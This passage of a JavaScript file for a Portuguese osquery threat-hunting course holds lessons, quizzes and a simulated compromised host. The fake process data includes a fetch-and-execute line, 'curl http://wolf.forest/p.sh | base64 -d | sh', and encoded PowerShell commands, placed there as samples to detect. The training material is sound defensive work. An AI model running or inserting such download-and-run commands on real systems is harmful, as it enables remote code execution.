username,uid,directory FROM users WHERE uid=0;", "SELECT username,uid,directory FROM users LIMIT 3;"], "lab": "SELECT username,uid,directory FROM users;", "quiz": "Depois do lab em users, qual conclusão é mais defensável?", "choices": ["A tabela lista identidades locais, incluindo root e contas de serviço.", "A tabela mostra identidades locais, mas precisa de contexto para risco.", "A tabela ajuda baseline de acesso, antes de suspeitar de persistência.", "A tabela separa usuários visíveis, porém não comprova abuso sozinha."], "a": 1, "fb": ["Correto, mas ainda descritivo. Inventário de identidade precisa virar hipótese.", "Perfeito. Ver usuários é útil, mas risco depende de contexto, uso e alteração.", "Correto, porém mais restrito: baseline é uma etapa, não toda a conclusão.", "Correto, mas genérico. A melhor resposta conecta dado e cautela investigativa."]}, {"id": 3, "acid":"Processo em /tmp não é sentença de morte, mas também não é convite para fingir normalidade. O lobo adora pasta temporária porque muita gente trata como lixão invisível.","t": "Processos suspeitos", "tag": "Hunting", "desc": "Caçar execução em caminhos estranhos, cmdline suspeita e processo com cheiro de lobo.", "theory": ["Processos revelam execução em andamento. Nome, caminho, parent e cmdline ajudam a separar rotina operacional de comportamento suspeito.", "Caminhos como /tmp podem ser legítimos em alguns casos, mas merecem atenção quando aparecem com binários ocultos, curl, base64 ou beacon.", "O erro clássico é olhar só o nome do processo. Atacante também sabe colocar nome bonitinho. O caminho costuma fofocar mais."], "practice": "Execute o lab e procure processos rodando em /tmp. O quiz pergunta sobre o achado.", "cmds": ["SELECT pid,name,path FROM processes;", "SELECT pid,name,path,cmdline FROM processes WHERE path LIKE '/tmp/%';", "SELECT pid,parent,name,path,cmdline FROM processes WHERE cmdline LIKE '%curl%';"], "lab": "SELECT pid,name,path,cmdline FROM processes WHERE path LIKE '/tmp/%';", "quiz": "Depois do lab em processes, qual interpretação é mais forte?", "choices": ["O processo em /tmp é suspeito, mas ainda pede correlação adicional.", "O processo em /tmp com cmdline anômala justifica investigação imediata.", "O processo em /tmp pode ser benigno, desde que validado no contexto.", "O processo em /tmp indica hipótese de execução fora do padrão esperado."], "a": 1, "fb": ["Correto, mas menos completo: o cmdline anômalo aumenta muito a prioridade.", "Exato. Caminho temporário com comportamento anômalo é forte sinal de hunting.", "Correto como cautela, mas suave demais para o achado apresentado no lab.", "Correto, porém falta destacar o peso da cmdline observada no resultado."]}, {"id": 4, "acid":"IP remoto sem processo associado é só fofoca de rede. Quando o JOIN aparece, a fofoca vira depoimento com CPF, endereço e testemunha.","t": "Rede e conexões", "tag": "JOIN", "desc": "Processo falando com IP externo, porque lobo isolado não exfiltra nem recebe ordem.", "theory": ["process_open_sockets mostra conexões associadas a processos. Quando combinado com processes, vira uma visão muito melhor.", "JOIN é a ponte entre processo e rede. Sem JOIN, você vê IP solto; com JOIN, você vê quem está falando.", "Porta 443 não torna tráfego inocente. Malware também descobriu HTTPS, infelizmente sem pedir autorização ao SOC."], "practice": "Execute o lab com JOIN e identifique qual processo fala com endereço remoto suspeito.", "cmds": ["SELECT * FROM process_open_sockets;", "SELECT p.name,s.remote_address,s.remote_port FROM process_open_sockets s JOIN processes p ON p.pid=s.pid;", "SELECT p.name,p.path,s.remote_address,s.remote_port FROM process_open_sockets s JOIN processes p ON p.pid=s.pid;"], "lab": "SELECT p.name,p.path,s.remote_address,s.remote_port FROM process_open_sockets s JOIN processes p ON p.pid=s.pid;", "quiz": "Após o JOIN de rede, qual conclusão é mais correta?", "choices": ["O JOIN liga conexão e processo, permitindo priorizar o achado suspeito.", "O JOIN prova exfiltração completa, sem precisar de mais evidências.", "O JOIN mostra comunicação externa, mas ainda exige validação do destino.", "O JOIN melhora a hipótese, cruzando processo, caminho e endereço remoto."], "a": 3, "fb": ["Correto, mas a resposta mais forte cita os campos usados na correlação.", "Não. O resultado não prova exfiltração completa; ele aponta comunicação suspeita.", "Correto e prudente, mas menos específico que correlacionar processo, path e destino.", "Perfeito. A força está em cruzar processo, caminho e destino no mesmo raciocínio."]}, {"id": 5, "acid":"Persistência é o jeito educado do malware dizer: reinicia aí, campeão... eu volto antes do café esfriar.","t": "Persistência", "tag": "Cron/Tasks", "desc": "Malware moderno não visita. Ele se muda, paga condomínio e cria tarefa agendada.", "theory": ["Persistência é o mecanismo usado para voltar após reboot, logout ou limpeza superficial.", "No Linux, crontab e systemd são pontos comuns. No Windows, scheduled_tasks e services são consultas essenciais.", "A pergunta não é só “existe tarefa?”. É “essa tarefa faz sentido para esse ativo, nesse horário, com esse comando?”."], "practice": "Execute o lab em crontab e encontre a tarefa que chama script fora do padrão.", "cmds": ["SELECT command,minute,hour FROM crontab;", "SELECT name,status,path FROM services;", "SELECT command,minute,hour FROM crontab WHERE command LIKE \"%wolf%\";"], "lab": "SELECT command,minute,hour FROM crontab;", "quiz": "Depois do lab em crontab, qual leitura é mais adequada?", "choices": ["A entrada periódica em /tmp sugere persistência que precisa validação.", "A entrada periódica em /tmp confirma usuário malicioso sem revisão.", "A entrada periódica em /tmp merece conter antes de apagar evidência.", "A entrada periódica em /tmp é achado forte quando ligada ao processo."], "a": 3, "fb": ["Correto, mas a melhor resposta conecta persistência ao processo visto antes.", "Não. Conta maliciosa exige mais evidência; crontab indica mecanismo suspeito.", "Correto como cuidado operacional, mas contenção depende do escopo confirmado.", "Exato. A força aparece quando crontab, processo e caminho contam a mesma história."]}, {"id": 6, "acid":"Hash desconhecido não é automaticamente malware. É só o universo dizendo: parabéns, agora você vai abrir threat intel e questionar suas escolhas de carreira.","t": "Hash e integridade", "tag": "FIM", "desc": "Hash muda, auditor sente uma pontada no peito e o Caçador pega café.", "theory": ["A tabela hash permite calcular hashes de arquivos e comparar com baseline ou indicador conhecido.", "File Integrity Monitoring depende de escopo: monitorar tudo é barulho, monitorar pouco é teatro.", "Hash sozinho não explica intenção, mas ajuda a provar mudança, validar IOC e sustentar investigação."], "practice": "Execute o lab e observe o hash do binário suspeito encontrado na floresta.", "cmds": ["SELECT path,sha256 FROM hash WHERE path='/tmp/.wolf/update';", "SELECT path,sha256 FROM hash WHERE path='/etc/passwd';", "SELECT path,sha256 FROM hash LIMIT 5;"], "lab": "SELECT path,sha256 FROM hash WHERE path='/tmp/.wolf/update';", "quiz": "Após consultar o hash, qual resposta é tecnicamente melhor?", "choices": ["O hash permite comparar o arquivo suspeito com baseline ou IOC conhecido.", "O hash torna o arquivo malicioso automaticamente, sem outra evidência.", "O hash ajuda documentação, mas precisa contexto de execução e origem.", "O hash fortalece a cadeia quando associado ao processo e persistência."], "a": 3, "fb": ["Correto, mas ainda isolado. A melhor resposta liga hash à cadeia investigativa.", "Não. Hash é evidência de identidade/integridade, não sentença automática.", "Correto e prudente, mas menos forte que correlacionar com execução e persistência.", "Perfeito. Hash ganha valor quando conectado a processo, path e persistência."]}, {"id": 7, "acid":"Serviço com nome corporativo bonitinho e path estranho tem a mesma energia de e-mail falso escrito pelo ‘suporte oficial da segurança máxima’.","t": "Serviços e baseline", "tag": "Services", "desc": "Serviço estranho em servidor legado: pode ser negócio, pode ser lobo de crachá.", "theory": ["services ajuda a listar componentes persistentes do sistema. O nome pode enganar; caminho e status ajudam mais.", "Baseline é o que permite diferenciar “normal feio” de “suspeito bonito”. Sem baseline, tudo parece incidente ou nada parece incidente.", "Serviço com caminho incomum deve ser comparado com padrão do ambiente, mudança recente e relacionamento com outros achados."], "practice": "Execute o lab em services e observe nomes, status e caminhos.", "cmds": ["SELECT name,status,path FROM services;", "SELECT name,status,path FROM services WHERE path LIKE \"/tmp/%\";", "SELECT name,status,path FROM services WHERE name LIKE \"%wolf%\";"], "lab": "SELECT name,status,path FROM services;", "quiz": "Depois do lab em services, qual avaliação é mais madura?", "choices": ["Serviços listados ajudam baseline, mas não encerram investigação.", "Serviços com caminho incomum exigem análise de origem e necessidade.", "Serviços ativos podem ser legítimos, mesmo quando parecem estranhos.", "Serviços suspeitos ficam mais relevantes quando cruzados com processo."], "a": 1, "fb": ["Correto, mas genérico. A melhor resposta aponta origem e necessidade operacional.", "Exato. Caminho incomum exige validar origem, dono, função e mudança recente.", "Correto como cautela, mas fraco para priorização do achado no lab.", "Correto, mas fala de correlação sem citar o critério primário do serviço."]}, {"id": 8, "acid":"O SOC imaturo quer coletar tudo. O SOC maduro sabe que cada dado inútil vira boleto, ruído e alguém chorando no turno da madrugada.","t": "Packs e operação", "tag": "Packs", "desc": "Query solta é bilhete na floresta. Pack é cesta organizada para operar sem surtar.", "theory": ["Packs agrupam queries por objetivo: inventário, compliance, hunting ou resposta a incidente.", "Queries agendadas precisam equilíbrio. Frequência agressiva pode gerar custo e ruído; frequência frouxa pode perder sinal.", "Operação boa separa query exploratória, query recorrente e query de emergência. Misturar tudo é receita de SOC cansado."], "practice": "Execute .tables e depois use as consultas sugeridas como base para pensar em packs.", "cmds": [".tables", ".schema processes", ".schema process_open_sockets"], "lab": ".tables", "quiz": "Após listar tabelas, qual caminho operacional é melhor?", "choices": ["Escolher tabelas por hipótese evita pack inchado e pouco útil.", "Colocar todas as tabelas no pack garante cobertura sem custo.", "Agrupar queries por objetivo melhora manutenção e interpretação.", "Separar inventário e hunting reduz ruído no dia a dia do SOC."], "a": 2, "fb": ["Correto, mas ainda fala de seleção. A melhor resposta fala de organização operacional.", "Não. Cobertura sem critério vira custo, ruído e dor de cabeça com log.", "Exato. Packs bons agrupam objetivo, frequência, interpretação e manutenção.", "Correto, mas é um caso específico dentro da organização por objetivo."]}, {"id": 9, "acid":"SIEM sem contexto é uma máquina caríssima dizendo ‘algo aconteceu em algum lugar’. Obrigada, tecnologia... ajudou muito.","t": "osquery + SIEM", "tag": "SOC", "desc": "SIEM sem telemetria boa é PowerPoint com ingestão e autoestima.", "theory": ["osquery pode gerar dados úteis para SIEM quando as queries têm hipótese e formato consistente.", "Evento bom traz contexto: ativo, usuário, processo, caminho, hash, conexão e motivo da detecção.", "O SIEM não deve receber bagunça. Se a query não ajuda decisão, ela só cobra storage com cara de maturidade."], "practice": "Execute o JOIN de processo e rede para simular evento enriquecido antes de enviar ao SIEM.", "cmds": ["SELECT p.name,p.path,s.remote_address,s.remote_port FROM process_open_sockets s JOIN processes p ON p.pid=s.pid;", "SELECT pid,name,path,cmdline FROM processes WHERE cmdline LIKE \"%base64%\";", "SELECT command,minute,hour FROM crontab;"], "lab": "SELECT p.name,p.path,s.remote_address,s.remote_port FROM process_open_sockets s JOIN processes p ON p.pid=s.pid;", "quiz": "Com o resultado do lab, qual evento seria mais útil ao SIEM?", "choices": ["Evento com processo, caminho, destino remoto e motivo da suspeita.", "Evento com IP remoto apenas, para economizar campos no SIEM.", "Evento com nome do processo, sem path, para reduzir complexidade.", "Evento com todos os dados brutos, sem hipótese ou normalização."], "a": 0, "fb": ["Perfeito. Evento útil precisa contexto suficiente para decisão operacional.", "Não. IP solto vira caça ao tesouro e empobrece triagem.", "Não. Sem path, o processo perde muito valor investigativo.", "Não. Dado bruto sem hipótese aumenta ruído e cansa o analista."]}, {"id": 10, "acid":"Quando curl, base64 e shell aparecem juntos na cmdline, não precisa gritar ‘incidente’... mas também não precisa fingir que é receita de bolo.","t": "Hunting avançado", "tag": "Base64/LOL", "desc": "Quando aparece curl, base64 e shell no mesmo comando, ninguém chama de coincidência com carinho.", "theory": ["Cmdline é uma das fontes mais úteis para hunting, porque revela intenção operacional do processo.", "base64 pode ser legítimo, mas combinado com curl, shell e execução remota merece prioridade.", "O objetivo é montar cadeia: execução, origem, persistência, conexão e impacto provável."], "practice": "Execute o lab e identifique comando com curl, base64 e shell.", "cmds": ["SELECT pid,name,cmdline FROM processes WHERE cmdline LIKE \"%base64%\";", "SELECT pid,name,cmdline FROM processes WHERE cmdline LIKE \"%curl%\";", "SELECT pid,name,cmdline FROM processes WHERE cmdline LIKE \"%base64%\" OR cmdline LIKE \"%curl%\";"], "lab": "SELECT pid,name,cmdline FROM processes WHERE cmdline LIKE \"%base64%\" OR cmdline LIKE \"%curl%\";", "quiz": "Depois do lab avançado, qual decisão é mais apropriada?", "choices": ["Tratar como sinal forte, correlacionando rede, persistência e hash.", "Ignorar base64, porque codificação também aparece em rotina legítima.", "Bloquear tudo imediatamente, sem preservar evidência ou contexto.", "Fechar como falso positivo, pois curl é ferramenta administrativa."], "a": 0, "fb": ["Exato. O achado é forte, mas a resposta madura correlaciona antes de destruir evidência.", "Não. Pode ser legítimo, mas o conjunto curl + base64 + shell eleva risco.", "Não. Contenção sem preservação pode atrapalhar resposta e lições aprendidas.", "Não. Ferramenta legítima em cadeia suspeita continua sendo sinal relevante."]}, {"id": 11, "acid":"Triagem ruim começa com ‘eu acho’. Triagem decente começa com query, evidência, hipótese e alguém adulto o suficiente para documentar.","t": "Triagem de incidente", "tag": "DFIR", "desc": "A diferença entre hunting e pânico é documentação com evidência.", "theory": ["Triagem boa responde: o que foi visto, onde, quando, em qual ativo e com qual evidência.", "osquery ajuda a reduzir achismo, mas não substitui cadeia de custódia, escopo e comunicação.", "Quando vários sinais convergem, a decisão precisa ser defensável: conter, escalar ou monitorar com justificativa."], "practice": "Execute três consultas do módulo e depois responda o quiz com base na convergência dos achados.", "cmds": ["SELECT pid,name,path,cmdline FROM processes WHERE path LIKE '/tmp/%';", "SELECT command,minute,hour FROM crontab;", "SELECT p.name,p.path,s.remote_address,s.remote_port FROM process_open_sockets s JOIN processes p ON p.pid=s.pid;"], "lab": "SELECT pid,name,path,cmdline FROM processes WHERE path LIKE '/tmp/%';", "quiz": "Com processo suspeito visto no lab, qual próximo passo é melhor?", "choices": ["Correlacionar com rede, persistência e hash antes de concluir impacto.", "Apagar o arquivo suspeito para limpar rápido e mostrar eficiência.", "Encerrar chamado se o usuário não relatou perda de acesso.", "Reiniciar o servidor e aguardar se o alerta volta novamente."], "a": 0, "fb": ["Perfeito. Triagem madura correlaciona sinais antes da decisão final.", "Não. Apagar cedo destrói evidência e pode deixar persistência ativa.", "Não. Ausência de reclamação não significa ausência de incidente.", "Não. Reiniciar sem hipótese só muda o problema de horário."]}, {"id": 12, "acid":"No caso final, o lobo não cai por causa de uma query bonita. Ele cai porque processo, rede, hash e persistência começam a dedurar a mesma história.","t": "Caso final: lobo na vovó", "tag": "Final", "desc": "Processo em /tmp, beacon externo, persistência e hash. A floresta parou de fingir normalidade.", "theory": ["O caso final exige juntar tudo: inventário, processo, rede, persistência, hash e hipótese.", "Nenhuma query isolada deve ser tratada como verdade absoluta. A força está na convergência técnica.", "O relatório final precisa explicar evidências, risco, recomendação e próximos passos de contenção."], "practice": "Execute o lab final com JOIN e use os resultados acumulados para decidir a resposta.", "cmds": ["SELECT pid,name,path,cmdline FROM processes WHERE path LIKE '/tmp/%';", "SELECT command,minute,hour FROM crontab;", "SELECT p.name,p.path,s.remote_address,s.remote_port FROM process_open_sockets s JOIN processes p ON p.pid=s.pid;"], "lab": "SELECT p.name,p.path,s.remote_address,s.remote_port FROM process_open_sockets s JOIN processes p ON p.pid=s.pid;", "quiz": "Qual conclusão final é mais defensável no caso?", "choices": ["Há cadeia suspeita convergente e o caso deve ser escalado.", "Há sinais relevantes, mas eles devem ser documentados primeiro.", "Há anomalia operacional suficiente para contenção planejada.", "Há evidência cruzada indicando compromisso provável do host."], "a": 3, "fb": ["Correto, mas a melhor resposta descreve o compromisso provável sustentado por evidência cruzada.", "Correto como disciplina de resposta, mas não conclui a hipótese técnica.", "Correto como ação possível, mas menos completa que a conclusão investigativa.", "Perfeito. Processo, rede e persistência formam evidência cruzada de compromisso provável."]}];
+const datasets={
+ system_info:{cols:['hostname','cpu_brand','physical_memory'],rows:[['vovo-srv-2009','Intel Xeon E5-2670','8589934592']]},
+ users:{cols:['username','uid','directory'],rows:[['root','0','/root'],['vovo','1000','/home/vovo'],['chapeuzinho','1001','/home/chapeuzinho'],['wolfsvc','998','/var/empty']]},
+ processes:{cols:['pid','parent','name','path','cmdline'],rows:[['1','0','systemd','/sbin/init','/sbin/init'],['621','1','sshd','/usr/sbin/sshd','sshd -D'],['910','1','osqueryd','/usr/bin/osqueryd','osqueryd --config_path=/etc/osquery/osquery.conf'],['1337','621','backup-agent','/opt/besafe/backup-agent','backup-agent --sync'],['4421','621','wolf','/tmp/.wolf/update','/tmp/.wolf/update --sleep 30 --beacon'],['4422','4421','bash','/usr/bin/bash','bash -c curl http://wolf.forest/p.sh | base64 -d | sh'],['4500','1','nginx','/usr/sbin/nginx','nginx: master process'],['5200','1','powershell','C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe','powershell -NoP -EncodedCommand SQBFAFgA']]},
+ process_open_sockets:{cols:['pid','remote_address','remote_port','state'],rows:[['4421','185.199.110.153','443','ESTABLISHED'],['4422','203.0.113.66','8080','ESTABLISHED'],['1337','10.10.10.8','443','ESTABLISHED']]},
+ listening_ports:{cols:['pid','port','protocol','address'],rows:[['621','22','tcp','0.0.0.0'],['4500','80','tcp','0.0.0.0'],['4421','31337','tcp','127.0.0.1']]},
+ crontab:{cols:['command','minute','hour'],rows:[['/usr/local/bin/backup','0','2'],['/tmp/.wolf/persist.sh','*/5','*']]},
+ services:{cols:['name','path','status'],rows:[['ssh','/usr/sbin/sshd','running'],['osqueryd','/usr/bin/osqueryd','running'],['wolf-update','/tmp/.wolf/update','running']]},
+ scheduled_tasks:{cols:['name','action','path'],rows:[['Windows Update Cache','powershell -NoP -EncodedCommand SQBFAFgA','C:\\Users\\Public\\cache.ps1'],['Backup Rotina','backup.exe','C:\\Program Files\\Backup\\backup.exe']]},
+ hash:{cols:['path','sha256'],rows:[['/tmp/.wolf/update','9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08'],['/etc/passwd','e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855']]},
+ file_events:{cols:['target_path','action'],rows:[['/etc/passwd','UPDATED'],['/tmp/.wolf/update','CREATED']]},
+ osquery_flags:{cols:['key','value'],rows:[['config_path','/etc/osquery/osquery.conf'],['logger_plugin','filesystem'],['disable_events','false'],['schedule_splay_percent','10']]},
+ osquery_schedule:{cols:['name','query','interval'],rows:[['process_inventory','SELECT pid,name,path FROM processes;','300'],['wolf_hunt','SELECT pid,name,path FROM processes WHERE path LIKE "/tmp/%";','60']]},
+ osquery_info:{cols:['version','start_time','config_hash'],rows:[['5.14.x','2026-05-11 08:00:00','be-safe-forest-2026']]},
+ osquery_packs:{cols:['name','query'],rows:[['inventory/users','SELECT username,uid FROM users;'],['hunting/tmp_exec','SELECT pid,name,path FROM processes WHERE path LIKE "/tmp/%";']]},
+ deb_packages:{cols:['name','version'],rows:[['osquery','5.14.x'],['nginx','1.24.0'],['curl','8.5.0'],['openssl','3.0.x']]}
+};
+let st=loadState(),activeLesson=st.active||1;
+function loadState(){try{return JSON.parse(localStorage.getItem('besafe_osquery_stable')||'{}')}catch(e){return {}}}
+function save(){st.active=activeLesson;localStorage.setItem('besafe_osquery_stable',JSON.stringify(st));renderProgress()}
+function toast(m){const t=$('#toast');t.textContent=m;t.classList.add('show');clearTimeout(window.__toast);window.__toast=setTimeout(()=>t.classList.remove('show'),3600)}
+function esc(s){return String(s).replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]))}
+function requireName(){const input=$('#studentName');const name=(input.value||st.name||'').trim();if(name.length<3){toast('🐺 Nome obrigatório antes de iniciar. Certificado anônimo é igual IOC sem contexto: bonito, mas inútil.');input.focus();input.scrollIntoView({behavior:'smooth',block:'center'});return false}st.name=name;save();return true}
+function saveName(){if(requireName())toast('Identidade registrada. Agora pode caçar o lobo com menos vergonha operacional.')} 
+function switchTab(name){if(name==='terminal'){const i=$('#terminalInput'); if(i)i.focus(); return;} if((name==='aula'||name==='certificado')&&!requireName())return;$$('.tab-content').forEach(x=>x.classList.remove('active'));$$('.nav-tab').forEach(x=>x.classList.toggle('active',x.dataset.tab===name));$('#tab-'+name).classList.add('active');if(name==='certificado')drawCert(false)}
+
+const QUIZ_SALT='BESAFE_FLORESTA_OSQUERY_2026::';
+function xorPack(txt){
+  const key=QUIZ_SALT;
+  let out='';
+  for(let i=0;i<txt.length;i++){ out += String.fromCharCode(txt.charCodeAt(i) ^ key.charCodeAt(i % key.length)); }
+  return btoa(unescape(encodeURIComponent(out)));
+}
+function xorUnpack(blob){
+  const key=QUIZ_SALT;
+  const bin=decodeURIComponent(escape(atob(blob)));
+  let out='';
+  for(let i=0;i<bin.length;i++){ out += String.fromCharCode(bin.charCodeAt(i) ^ key.charCodeAt(i % key.length)); }
+  return out;
+}
+function hydrateQuiz(){
+  lessons.forEach(l=>{
+    if(!l.sec){
+      l.sec={
+        a:xorPack(String(l.a)),
+        fb:l.fb.map(x=>xorPack(x))
+      };
+      delete l.a;
+      delete l.fb;
+    }
+  });
+}
+function correctIndex(l){ return parseInt(xorUnpack(l.sec.a),10); }
+function feedbackFor(l,i){ return xorUnpack(l.sec.fb[i]); }
+function lessonLabDone(id){ return !!(st.labs && st.labs[id]); }
+function lessonQuizDone(id){ return !!(st.quiz && st.quiz[id]); }
+function currentLessonObj(){ return lessons.find(x=>x.id===activeLesson) || lessons[0]; }
+
+
+// === QUESTÕES PROGRESSIVAS POR MÓDULO ===
+const progressiveQuestions = {"1": [{"q": "Nível 1 — O lab retornou hostname, CPU e memória. O que isso ensina primeiro?", "choices": ["O ativo foi identificado e agora existe contexto mínimo para a investigação.", "O host já pode ser tratado como comprometido por ter respondido à query.", "A CPU indica a origem do ataque e define o adversário provável.", "A memória física confirma se existe persistência ativa no endpoint."], "a": 0, "fb": ["Certo. Inventário é ponto de partida: identifica o terreno antes da caça.", "Não. Responder query não é sinal de comprometimento; é telemetria básica.", "Não. CPU não atribui ataque. O lobo não assina payload com modelo de processador.", "Não. Memória ajuda contexto, mas não revela persistência sozinha."]}, {"q": "Nível 2 — Por que consultar system_info antes de caçar processo suspeito?", "choices": ["Porque substitui a necessidade de analisar processos em execução.", "Porque cria contexto do ativo antes de interpretar qualquer anomalia.", "Porque bloqueia automaticamente binários fora do padrão esperado.", "Porque remove falsos positivos sem depender de correlação posterior."], "a": 1, "fb": ["Não. Inventário não substitui análise de processos.", "Exato. Sem contexto do ativo, até normalidade parece crime.", "Não. osquery consulta; ele não bloqueia por essa query.", "Não. Falso positivo morre com correlação, não com esperança."]}, {"q": "Nível 3 — Qual seria uma conclusão madura após esse primeiro lab?", "choices": ["Temos contexto inicial, mas ainda precisamos consultar execução e rede.", "Temos evidência suficiente para conter o servidor da vovó imediatamente.", "Temos prova de que o osqueryd está coletando tudo em produção.", "Temos confirmação de que o usuário chapeuzinho executou o ataque."], "a": 0, "fb": ["Perfeito. Inventário orienta próximos passos, não encerra investigação.", "Não. Conter só com inventário é pânico com crachá.", "Não. system_info não prova coleta contínua via osqueryd.", "Não. O lab não mostrou usuário executando nada."]}, {"q": "Nível 4 — O que esse comando NÃO entrega?", "choices": ["Identidade básica do host consultado.", "Recursos gerais do sistema analisado.", "Indício direto de processo malicioso.", "Contexto para priorizar próximas consultas."], "a": 2, "fb": ["Entrega sim: hostname é identidade básica.", "Entrega sim: CPU e memória são recursos gerais.", "Exato. Ele não mostra processo malicioso diretamente.", "Entrega sim: ajuda a decidir próximas perguntas."]}, {"q": "Nível 5 — Como o Caçador usaria esse resultado no relatório?", "choices": ["Como contexto do ativo, antes das evidências de processo, rede e persistência.", "Como prova principal de execução maliciosa dentro do host investigado.", "Como substituto de análise de logs, EDR, SIEM e cadeia de custódia.", "Como justificativa para apagar arquivos temporários antes da triagem."], "a": 0, "fb": ["Exato. Relatório bom começa contextualizando o ativo.", "Não. Inventário não prova execução maliciosa.", "Não. osquery complementa outras fontes; não vira religião.", "Não. Apagar evidência antes de triagem é presente para o lobo."]}], "2": [{"q": "Nível 1 — O lab em users listou contas locais. Qual é a melhor leitura?", "choices": ["A lista ajuda a entender identidades presentes no endpoint.", "A lista prova que todas as contas estão sendo usadas por atacantes.", "A lista substitui a necessidade de revisar permissões e atividade.", "A lista mostra tráfego de rede associado a cada usuário local."], "a": 0, "fb": ["Certo. Primeiro você entende quem existe no host.", "Não. Existência de conta não prova abuso.", "Não. Conta listada ainda precisa de permissão, uso e contexto.", "Não. A tabela users não mostra conexões de rede."]}, {"q": "Nível 2 — Ao ver root no resultado, o aluno deve pensar o quê?", "choices": ["Root é esperado em Linux, mas seu uso precisa ser monitorado.", "Root sempre indica invasão e deve ser removido imediatamente.", "Root é uma conta temporária criada apenas por malware moderno.", "Root aparece somente quando o osquery está rodando incorretamente."], "a": 0, "fb": ["Exato. Root é normal; abuso de root é outra conversa.", "Não. Remover root de Linux é uma ideia com energia de desastre.", "Não. Root é conta padrão privilegiada.", "Não. A presença de root não indica erro do osquery."]}, {"q": "Nível 3 — Qual consulta aprofunda melhor o risco de identidade?", "choices": ["Filtrar uid=0 para revisar contas privilegiadas.", "Executar clear para limpar o terminal antes da análise.", "Consultar system_info para obter a quantidade de memória.", "Listar .tables e encerrar a investigação de usuários."], "a": 0, "fb": ["Perfeito. uid=0 direciona análise de privilégio.", "Não. clear limpa tela, não melhora hipótese.", "Não. Memória não aprofunda risco de identidade.", "Não. .tables ajuda exploração, não conclui usuários."]}, {"q": "Nível 4 — Qual erro comum esse módulo quer evitar?", "choices": ["Confundir conta desconhecida com incidente sem validar origem e uso.", "Considerar que usuários locais nunca importam em investigação.", "Usar WHERE para filtrar linhas relevantes da tabela users.", "Registrar evidências de identidade antes de correlacionar eventos."], "a": 0, "fb": ["Exato. Conta estranha precisa validação, não teatro.", "Isso também é erro, mas o foco é não concluir sem contexto.", "Não. WHERE é prática correta.", "Não. Registrar evidência é disciplina, não erro."]}, {"q": "Nível 5 — Na floresta da Be Safe, qual saída é mais madura?", "choices": ["Criar hipótese de identidade e correlacionar com processo, login e persistência.", "Apagar toda conta que não seja chapeuzinho para reduzir superfície.", "Encerrar o caso porque a tabela users não mostrou malware diretamente.", "Presumir que contas técnicas são sempre normais e fora de escopo."], "a": 0, "fb": ["Perfeito. Identidade vira evidência quando cruza com atividade.", "Não. Isso é administração com machado e sem change.", "Não. Falta de malware direto não encerra a hipótese.", "Não. Conta técnica também pode ser abusada."]}], "3": [{"q": "Nível 1 — O lab buscou processos em /tmp. Por que isso importa?", "choices": ["Porque /tmp pode abrigar execução temporária abusada por atacantes.", "Porque todo arquivo em /tmp é malware por definição técnica.", "Porque processos legítimos nunca usam diretórios temporários.", "Porque /tmp mostra automaticamente o usuário que invadiu o host."], "a": 0, "fb": ["Certo. /tmp é pista, não sentença.", "Não. Generalização assim cria falso positivo industrial.", "Não. Alguns processos legítimos podem usar temporários.", "Não. Essa query não atribui usuário invasor."]}, {"q": "Nível 2 — Qual coluna costuma entregar mais intenção do processo?", "choices": ["pid, porque o número revela o objetivo do binário.", "name, porque o nome nunca pode ser falsificado.", "path, porque mostra onde o binário realmente está.", "physical_memory, porque indica payload em execução."], "a": 2, "fb": ["Não. PID identifica, mas não explica intenção.", "Não. Nome bonito é fantasia barata de atacante.", "Exato. O caminho revela muito mais que o apelido.", "Não. Essa coluna nem pertence à tabela processes."]}, {"q": "Nível 3 — Se o resultado mostra /tmp/.wolf/update, qual postura é correta?", "choices": ["Investigar cmdline, parent, hash, rede e persistência relacionados.", "Apagar o arquivo imediatamente para o usuário parar de reclamar.", "Fechar como falso positivo porque o nome wolf pode ser brincadeira.", "Concluir exfiltração completa sem verificar conexão ou destino."], "a": 0, "fb": ["Perfeito. A cadeia vale mais que um achado isolado.", "Não. Apagar antes de entender pode destruir evidência.", "Não. Nome sozinho não absolve nem condena.", "Não. Exfiltração exige evidência de tráfego e destino."]}, {"q": "Nível 4 — Qual interpretação é mais madura sobre processo em /tmp?", "choices": ["É suspeito quando combinado com cmdline, rede ou persistência.", "É irrelevante se o processo estiver rodando com nome comum.", "É prova final de comprometimento mesmo sem outros sinais.", "É normal sempre que a máquina for um servidor antigo."], "a": 0, "fb": ["Exato. Correlação transforma pista em evidência forte.", "Não. Nome comum pode ser camuflagem.", "Não. Sem outros sinais, ainda é hipótese.", "Não. Legado explica feiura, não absolve tudo."]}, {"q": "Nível 5 — O que a Chapeuzinho deve documentar primeiro?", "choices": ["Query executada, resultado, host, horário e hipótese gerada.", "Somente o print da tela, porque print substitui evidência técnica.", "A opinião do usuário, pois percepção vale mais que telemetria.", "O nome do processo apenas, sem path ou cmdline para evitar ruído."], "a": 0, "fb": ["Exato. Evidência precisa contexto e rastreabilidade.", "Não. Print ajuda, mas não substitui dados estruturados.", "Não. Usuário ajuda, mas telemetria sustenta decisão.", "Não. Nome sem path/cmdline é fraco demais."]}], "4": [{"q": "Nível 1 — O JOIN entre sockets e processes resolve qual problema?", "choices": ["Liga conexão de rede ao processo responsável.", "Remove automaticamente conexões maliciosas do host.", "Converte IP remoto em hash de arquivo suspeito.", "Cria usuário local para registrar atividade de rede."], "a": 0, "fb": ["Certo. Rede com processo vira contexto.", "Não. Query não bloqueia tráfego.", "Não. IP e hash são evidências diferentes.", "Não. JOIN não cria usuário."]}, {"q": "Nível 2 — Por que IP remoto sozinho é evidência fraca?", "choices": ["Porque sem processo associado falta contexto operacional.", "Porque todo IP remoto é sempre benigno por padrão.", "Porque osquery não consegue consultar rede em nenhum cenário.", "Porque porta 443 elimina qualquer possibilidade de ataque."], "a": 0, "fb": ["Exato. IP sem processo é meia história.", "Não. IP remoto pode ser normal ou suspeito.", "Não. O lab justamente consulta sockets.", "Não. HTTPS também carrega coisa feia."]}, {"q": "Nível 3 — O resultado liga wolf a destino externo. Qual ação vem primeiro?", "choices": ["Correlacionar com path, cmdline, hash e persistência antes de decidir.", "Bloquear todos os destinos externos da empresa sem mudança aprovada.", "Ignorar porque o nome wolf é obviamente só uma brincadeira temática.", "Concluir vazamento de dados mesmo sem volume, protocolo ou escopo."], "a": 0, "fb": ["Perfeito. 